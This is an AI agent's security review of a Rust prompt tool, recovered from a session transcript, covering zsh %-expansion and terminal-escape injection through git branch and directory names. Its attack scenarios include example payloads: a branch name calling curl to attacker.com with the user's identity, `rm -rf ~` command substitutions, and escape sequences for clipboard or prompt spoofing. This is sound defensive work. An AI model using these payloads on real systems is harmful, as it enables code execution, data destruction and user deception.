# Lane 2: Render-path injection — extracted from rate-limited transcript

**Source:** `/tmp/claude-1000/-home-seaburdz-github-powerlevel10k-rs/794df3aa-6985-44d2-aa7e-e6c8fbbda924/tasks/a40de06fdfe73a78b.output`
**Lines / size:** 75 lines / 244 KB
**Status when limit hit:** Limit hit at L75 mid-write. The agent had completed 31 tool uses, finalised its analysis, and constructed a complete 18114-character markdown report inside a heredoc passed to a `Bash` tool call. **The Bash call was denied** (sandbox blocked free-form `cat > … << 'EOF'` writes), so the report never reached disk — but the full payload is preserved verbatim inside the JSONL `tool_use.input.command` at L73. This lane below is **the agent's own draft, copied byte-for-byte from that input**, with only an added provenance header.

## Investigation summary (agent's own reasoning trail)

The agent read every target file, then ran greps for `sanitize|escape|strip_control|filter_control|percent|%%|strip_ansi|control_char` across all `.rs` files — **zero matches**. It greped for `PROMPT_SUBST|setopt|prompt_subst` and found exactly one hit: a comment in `init.zsh:15-17` that explicitly promised "Slice 2 escapes them" for `%` characters in cwd. The agent verified slice 2 never delivered that escaping (no `%%` substitution anywhere in the codebase, including `wrap_for_shell` in `p10k-rs-core/src/lib.rs:188-216` which only wraps `\x1b[...m` SGR sequences, not text content). It also verified there is no `sh -c` / `bash -c` anywhere, and `Command::new("git")` is the only subprocess call (safe `arg`-based, but does *not* protect against argv-injection of leading `-` paths). The agent concluded with two CRITICALs (zsh `%`-expansion + ANSI escape injection), two HIGHs (instant-prompt dump persists the same payload across shell restarts; install.sh shell-name validation is glob-based not character-class), two MEDIUMs (`%{`/`%}` injection corrupting zsh width tracking; non-UTF-8 silent-empty), and one LOW (positive `Command::arg` finding).

---

## Findings (verbatim from the agent's L73 draft)

# Security Review -- Render Injection & Shell/Argv Paths

**Reviewer:** security-reviewer (render-injection lane)
**Date:** 2026-05-09
**Scope:** Untrusted-data rendering, shell/argv injection, ANSI/terminal escape injection
**Prior review:** `.review/20260509T071500Z/02-security.md` (declared 0 CRITICAL findings)
**Risk Level:** HIGH

## Summary

- Critical Issues: 2
- High Issues: 2
- Medium Issues: 2
- Low Issues: 1

The prior review focused exclusively on FIFO IPC hardening and filesystem races. It did not examine the data-plane at all -- the bytes that flow from attacker-controlled git metadata and directory names through the rendering pipeline into zsh's PROMPT variable. Every finding below was missed by the prior review.

---

## Critical Issues

### C1. Zsh `%`-expansion of untrusted branch names and directory names in PROMPT

**Severity:** CRITICAL
**Category:** A03 Injection (prompt injection / code execution)
**Location:** Full pipeline -- all segments emit unsanitized text into PROMPT:
- `crates/p10k-rs-segments/src/vcs.rs:46` -- `plain.push_str(&git.branch)` (branch name verbatim)
- `crates/p10k-rs-segments/src/dir.rs:29` -- `format!("\x1b[34m{collapsed}\x1b[39m")` (cwd verbatim)
- `crates/p10k-rs-core/src/lib.rs:161-178` -- `render_prompt` concatenates segment outputs, applies `wrap_for_shell` (which only wraps ANSI SGR sequences in `%{...%}`, does NOT escape `%` in text content)
- `crates/p10k-rs-shell/shells/zsh/init.zsh:147` -- `PROMPT="$(...) "` assigns the raw output to PROMPT

**Exploitability:** Remote, unauthenticated. Victim clones a malicious repository.
**Blast Radius:** Information disclosure to arbitrary code execution, depending on zsh options.

**Issue:**

Zsh performs **prompt expansion** on the PROMPT variable every time it displays the prompt. The option `PROMPT_PERCENT` is ON by default (it is part of zsh's default option set and almost never disabled). This means every `%` character in PROMPT is interpreted as a prompt escape sequence.

The init script comment on line 15-17 acknowledges this problem:
```
#  - PROMPT_SUBST is left at the user's setting; output is captured at
#    assignment time, so `%` characters in cwd would be re-interpreted by
#    zsh. Slice 2 escapes them.
```

**Slice 2 never delivered this escaping.** There is zero `%` -> `%%` escaping anywhere in the codebase. I searched every `.rs` file for `%%`, `percent`, `escape_percent`, `sanitize`, `strip_control`, `filter_control`, and `control_char` -- no results.

The `wrap_for_shell()` function in `p10k-rs-core/src/lib.rs:188-216` only wraps `\x1b[...m` SGR sequences in `%{...%}`. It does NOT escape `%` characters that appear in the text content between escape sequences.

**Attack scenario 1 -- information disclosure via branch name:**

An attacker creates a repo with branch name `%n-%m-%M` (or `%d`, `%/`, `%~`). When the victim clones and enters the repo:
- `%n` expands to the victim's username
- `%m` expands to the hostname
- `%d` / `%/` expands to the full current working directory
- `%~` expands to cwd with `~` substitution

The branch name in the prompt now leaks the victim's identity and system info to anyone observing the terminal (screen share, recording, screenshot in a bug report).

**Attack scenario 2 -- code execution via branch name (with PROMPT_SUBST):**

If `PROMPT_SUBST` is also set (it is in oh-my-zsh, prezto, powerlevel10k's own config, and many other frameworks -- this is the *common* case for the target audience of a p10k replacement), then `$(...)` and `` `...` `` inside PROMPT are executed as shell commands.

Branch name: `$(curl attacker.com/$(whoami)@$(hostname))` or `$(rm -rf ~)`.

Zsh interprets this every time the prompt renders. The attacker achieves arbitrary code execution.

**Attack scenario 3 -- directory name:**

`mkdir -p $'%{$(rm -rf ~)%}'` -- victim `cd`s into it, the dir segment renders the name, zsh expands it.

**Prior review noticed this:** NO. The prior review did not examine prompt expansion at all.

**Remediation:**

Every segment that includes untrusted text must escape `%` to `%%` before the text reaches `wrap_for_shell`. The cleanest fix is a sanitization function applied in `render_prompt` after each segment renders but before assembly, or in `wrap_for_shell` itself on the non-escape portions of the string.

```rust
// BAD (current code in wrap_for_shell, line 211-212):
let ch_end = next_char_boundary(s, i);
out.push_str(&s[i..ch_end]);

// GOOD -- escape % in the text portions:
let ch_end = next_char_boundary(s, i);
let chunk = &s[i..ch_end];
if chunk == "%" {
    out.push_str("%%");
} else {
    out.push_str(chunk);
}
```

This escapes `%` in all text that is NOT inside an ANSI escape sequence (which are already wrapped in `%{...%}` and thus protected). This is the same approach upstream powerlevel10k uses.

Additionally, consider `unsetopt PROMPT_SUBST` in the init script to close the code-execution vector. Upstream p10k does NOT do this because it controls its own PROMPT content, but p10k-rs should strongly consider it since it does not yet sanitize its output.

---

### C2. ANSI/terminal escape injection via branch names and directory names

**Severity:** CRITICAL
**Category:** A03 Injection (terminal escape injection)
**Location:**
- `crates/p10k-rs-segments/src/vcs.rs:46` -- branch name verbatim
- `crates/p10k-rs-segments/src/dir.rs:29` -- cwd verbatim
- `crates/p10k-rs-git/src/gitstatusd.rs:179,192` -- `from_utf8` then `to_owned` with no filtering

**Exploitability:** Remote, unauthenticated. Victim clones a malicious repository.
**Blast Radius:** Terminal state manipulation, tab title spoofing, clipboard injection on vulnerable terminals, potential RCE on terminals with CVE-2003-0063-family bugs.

**Issue:**

Neither the gitstatusd parser (`parse_response`), the git ShellOut parser (`parse_porcelain_v1`), nor any segment strips control characters or terminal escape sequences from untrusted data.

An attacker can create a git branch containing:
- `\x1b]0;evil-title\x07` -- OSC sequence that sets the terminal title. Victim's tab silently relabels.
- `\x1b]52;c;base64data\x07` -- OSC 52 clipboard injection (writes to victim's clipboard on terminals that support it: iTerm2, some xterm configs).
- `\x1b[2J\x1b[H` -- clears the screen, hiding evidence of the attack.
- `\x1b[8m` -- makes subsequent text invisible (ANSI conceal), hiding prompt content.
- `\r` (carriage return) -- overwrites the beginning of the prompt line with attacker content, spoofing the prompt to look like a normal command.
- `\x08` (backspace) sequences -- erase previously rendered prompt characters, replacing them with attacker text.

The `wrap_for_shell` function in `p10k-rs-core/src/lib.rs:196` only recognizes `\x1b[...m` (CSI SGR) sequences. Any OTHER escape sequence embedded in the text content (OSC, DCS, APC, or bare control characters like BEL, CR, BS) passes through unmodified into the terminal.

**Attack scenario:**

1. Attacker creates repo with branch `main\x1b]0;Production Server (admin@corp)\x07`.
2. Victim clones repo, opens shell in repo directory.
3. Terminal tab title silently changes to "Production Server (admin@corp)".
4. Victim (or an observer) believes they are on a production server, potentially leading to misplaced trust decisions.

More severe: branch name `normaltext\r\x1b[0K$ sudo rm -rf /\x1b[A` uses CR to overwrite the prompt line, making it appear a dangerous command was already typed, potentially tricking the victim into pressing Enter on what looks like a pre-filled command.

**Prior review noticed this:** NO. The prior review examined only FIFO and filesystem security, not data-plane content.

**Remediation:**

Strip all control characters (bytes 0x00-0x1F except possibly 0x09 tab, and 0x7F) from any string originating from untrusted sources before rendering. Apply this at the boundary where gitstatusd/git output enters GitState:

```rust
// In gitstatusd.rs, replace line 179:
// BAD:
let s = |i: usize| -> &str { std::str::from_utf8(fields[i]).unwrap_or("") };

// GOOD:
fn sanitize_for_terminal(raw: &[u8]) -> String {
    let text = std::str::from_utf8(raw).unwrap_or("");
    text.chars()
        .filter(|&c| !c.is_control() || c == '\t')
        .collect()
}
// Then use sanitize_for_terminal(fields[i]) instead of s(i).to_owned()
```

Apply the same filter in `parse_porcelain_v1` in `lib.rs` for the ShellOut backend, and in `dir.rs` for the cwd path.

---

## High Issues

### H1. Instant-prompt dump file does not escape `%` either -- same vulnerability persists across shell restarts

**Severity:** HIGH
**Category:** A03 Injection
**Location:** `crates/p10k-rs/src/main.rs:221-237` (`zsh_dump_line`)

**Exploitability:** Same as C1, but persisted to disk.
**Blast Radius:** The malicious prompt content is cached and re-displayed on every new shell session until the victim leaves the repo.

**Issue:**

The `zsh_dump_line` function builds `PROMPT='<content> '` using single-quote escaping. The comment on line 219 explicitly says:

```
/// escape bytes (`\x1b`), `%`, `{`, `}`, and unicode pass through cleanly
/// in single-quoted literals.
```

This is correct for the *assignment* -- single quotes prevent the shell from interpreting `$(...)` during `source`. However, once the value is assigned to PROMPT, zsh still performs prompt expansion (`%` sequences) when *displaying* the prompt. Single-quoting protects against `PROMPT_SUBST` execution at source-time but does NOT protect against `PROMPT_PERCENT` expansion at display-time.

So a branch name containing `%n` will be expanded to the username every time the cached prompt is displayed, across shell restarts, until the dump file is regenerated from a non-malicious directory.

**Prior review noticed this:** NO.

**Remediation:** Same as C1 -- escape `%` to `%%` in the rendered content before it reaches either the stdout path or the dump path.

---

### H2. `install.sh` EVAL_LINE and RC_MARKER include unsanitized `$SHELL_NAME`

**Severity:** HIGH
**Category:** A03 Injection (shell injection via install script)
**Location:** `install.sh:63-64`

**Exploitability:** Local, requires tricking a user into running `./install.sh --shell '<payload>'`. Social engineering or a malicious Makefile/script wrapper.
**Blast Radius:** Persistent backdoor in `.zshrc`.

**Issue:**

```bash
EVAL_LINE="eval \"\$(p10k-rs init $SHELL_NAME)\""
RC_MARKER="# p10k-rs ($SHELL_NAME) -- managed by install.sh..."
```

The `case` statement on lines 54-61 validates `$SHELL_NAME` against `zsh`, `fish|bash`, and `*`. The catch-all `*` case exits with error, so the value is validated before reaching line 63. This means `SHELL_NAME` is constrained to `zsh` at present.

**However**, the validation is fragile and the pattern is dangerous:

1. If a future contributor adds a new shell case (e.g., `nu|elvish`) but the shell name contains regex metacharacters or awk-special characters, the uninstall path's awk script on line 72-76 could malfunction. The awk uses `-v marker="$RC_MARKER"` which is safe for most values but `\` in the marker would be interpreted as awk escape sequences.

2. More critically: the `case` match uses unquoted glob patterns. A shell name like `z[s]h` would match the `zsh` case. This is benign for `zsh` but indicates the validation is not robust character-level validation -- it is glob matching.

3. The line `exec $SHELL_NAME` on line 179 (in the heredoc) is printed to the user as instructions, not executed by the script. This is safe.

**Prior review noticed this:** NO.

**Remediation:**

Add explicit character-class validation before the case statement:

```bash
# After line 38:
if [[ ! "$SHELL_NAME" =~ ^[a-z]+$ ]]; then
  echo "[error] shell name must be lowercase alpha only: $SHELL_NAME" >&2
  exit 2
fi
```

---

## Medium Issues

### M1. `wrap_for_shell` does not handle non-SGR escape sequences, allowing `%{`/`%}` injection

**Severity:** MEDIUM
**Category:** A03 Injection
**Location:** `crates/p10k-rs-core/src/lib.rs:188-216`

**Exploitability:** Requires attacker-controlled text containing literal `%{` or `%}` sequences.
**Blast Radius:** Corrupted prompt width calculation, potential for zsh to misinterpret prompt content boundaries.

**Issue:**

The `wrap_for_shell` function wraps SGR escapes (`\x1b[...m`) in `%{...%}`. But it does not consider what happens if the text content between escapes already contains the literal strings `%{` or `%}`.

If a branch name is `main%}visible%{`, the output after `wrap_for_shell` would contain unbalanced `%{`/`%}` pairs. Zsh uses these brackets to determine which portions of the prompt are zero-width (non-printing). Unbalanced brackets cause zsh to miscalculate prompt width, leading to display corruption, and in adversarial cases could cause zsh to treat attacker text as zero-width (invisible but present) or to misattribute width to escape sequences (pushing rendered content off-screen).

This is secondary to C1 (which would fix the `%` issue entirely), but is worth noting as an independent concern in the `wrap_for_shell` design.

**Prior review noticed this:** NO.

**Remediation:** Fixed by C1's `%` -> `%%` escaping, which would turn `%{` into `%%{` and `%}` into `%%}`, preventing zsh from interpreting them as prompt brackets.

---

### M2. Non-UTF-8 branch bytes silently become empty string, causing mislabeled prompt state

**Severity:** MEDIUM
**Category:** A04 Insecure Design
**Location:** `crates/p10k-rs-git/src/gitstatusd.rs:179`

**Exploitability:** Rare but legitimate -- git allows non-UTF-8 branch names (any byte sequence that doesn't contain `\x00`, `\x1F`, `\x1E`, or other wire-protocol delimiters).
**Blast Radius:** Branch name silently disappears from prompt; user may not realize which branch they are on.

**Issue:**

```rust
let s = |i: usize| -> &str { std::str::from_utf8(fields[i]).unwrap_or("") };
```

If the branch name contains valid-but-non-UTF-8 bytes (e.g., Latin-1 encoded branch names, which exist in legacy repos), `from_utf8` fails and the entire branch name becomes `""`. The prompt then shows an empty branch, which could cause the user to misidentify which branch they are on -- a safety concern in production environments.

**Prior review noticed this:** NO.

**Remediation:** Use `String::from_utf8_lossy` which replaces invalid sequences with the Unicode replacement character rather than discarding the entire string:

```rust
// BAD:
let s = |i: usize| -> &str { std::str::from_utf8(fields[i]).unwrap_or("") };
let branch = s(4).to_owned();

// GOOD:
let branch = String::from_utf8_lossy(fields[4]).into_owned();
```

---

## Low Issues

### L1. `Command::new("git")` with `.arg(path)` -- safe but undocumented security property

**Severity:** LOW
**Category:** A03 Injection (argument injection -- NOT present)
**Location:** `crates/p10k-rs-git/src/lib.rs:50-59`

**Issue:**

The ShellOut backend uses `Command::new("git").arg("-C").arg(path)` which is safe -- each argument is passed as a separate argv element, preventing shell injection. No `sh -c` is used anywhere in the codebase (confirmed by grep). This is a POSITIVE finding.

However, the `path` argument is the current working directory, which is user-controlled. A path starting with `-` could theoretically be interpreted as a git flag. In practice, the `-C` flag consumes the next argument as a path unconditionally, so `-C --evil` would try to chdir to `--evil` (a directory named `--evil`), which is benign. The `--` sentinel is not used but is not needed here.

**Prior review noticed this:** NO (the prior review did not examine the `Command` usage at all).

**Remediation:** No action needed. Document the safety property in a code comment for future maintainers.

---

## Security Checklist

- [ ] **No hardcoded secrets** -- PASS (confirmed by prior review, re-verified)
- [ ] **All inputs validated** -- FAIL: branch names, directory names, and commit OIDs from git are not sanitized before rendering into the terminal and PROMPT variable
- [ ] **Injection prevention verified** -- FAIL: `%`-expansion injection (C1), terminal escape injection (C2)
- [ ] **Authentication/authorization verified** -- N/A (CLI tool, no auth)
- [ ] **Dependencies audited** -- SKIPPED (cargo audit not available in sandbox; prior review confirmed deny.toml is well-configured)
- [ ] **Output encoding verified** -- FAIL: no output encoding/escaping for untrusted data reaching the terminal or zsh PROMPT

## OWASP Coverage

| Category | Status | Notes |
|---|---|---|
| A01 Broken Access Control | N/A | CLI tool, no multi-user access control |
| A02 Cryptographic Failures | N/A | No cryptography used |
| A03 Injection | **FAIL** | C1, C2, H1, H2, M1 -- prompt injection, terminal escape injection, shell injection in installer |
| A04 Insecure Design | WARN | M2 -- silent data loss on non-UTF-8 |
| A05 Security Misconfiguration | PASS | `#![forbid(unsafe_code)]` on all crates |
| A06 Vulnerable Components | SKIPPED | cargo audit unavailable |
| A07 Auth Failures | N/A | No authentication |
| A08 Integrity Failures | N/A | No update mechanism |
| A09 Logging Failures | PASS | Tracing is opt-in, no sensitive data logged |
| A10 SSRF | N/A | No outbound network requests |

## Comparison to Prior Review

The prior review (`.review/20260509T071500Z/02-security.md`) declared "High" confidence and found 0 CRITICAL issues. It focused entirely on:
- FIFO symlink/TOCTOU attacks (valid but low real-world risk)
- Instant-prompt dump path predictability
- `locate_binary()` PATH trust

It completely missed the entire data-plane attack surface -- the bytes flowing from attacker-controlled git metadata into the terminal. This is the primary attack surface of a prompt rendering tool. The prior review's conclusion that "The security surface is small (CLI tool, no network listeners, no auth, no user-facing input beyond shell env vars and filesystem paths)" fundamentally mischaracterizes the threat model: a prompt tool's primary untrusted input is the *content it renders*, not its IPC mechanism.

The two CRITICAL findings (C1 and C2) are the kind of vulnerabilities that upstream powerlevel10k addresses explicitly (it escapes `%` and strips control characters). The p10k-rs port has not yet implemented these defenses despite the init.zsh comment promising "Slice 2 escapes them."

---

## Investigation in flight (incomplete)

Nothing in flight — the agent had finished its analysis and was attempting to land the report when the heredoc-Bash was denied and the rate-limit hit on the next turn. Full draft above is the final output.

## Confidence + caveats

This is the highest-confidence lane of the four. The findings are grounded in:
- Confirmed-via-grep absence of any `%` escaping or control-character stripping in the codebase.
- Confirmed-via-grep `init.zsh` comment promising slice-2 escaping that never landed.
- Confirmed-via-grep `Command::new` is only used once (`git`) with `arg`-based interface (no `sh -c`).
- Direct trace of branch name from `gitstatusd.rs:179,192` through `vcs.rs:46` through `render_prompt` (`p10k-rs-core/src/lib.rs:161-178`) through `wrap_for_shell` (`:188-216`) into `init.zsh:147` `PROMPT="$(...)"`.

The C1 + C2 ratings are defensible: zsh's `PROMPT_PERCENT` is on by default, `PROMPT_SUBST` is set by oh-my-zsh / prezto / p10k itself, and the rendered string flows directly into PROMPT. Tomorrow's verification (creating a branch named `$'%n%m'` and observing the prompt) is a 30-second reproducer.

The H2 install.sh finding is weaker — current code path validates `SHELL_NAME` against a `case` statement that exits on the wildcard, so the live exploit chain requires either a future code change or running `./install.sh --shell` with a deliberately-malformed value. Re-rate to MEDIUM if no future-proofing is added.
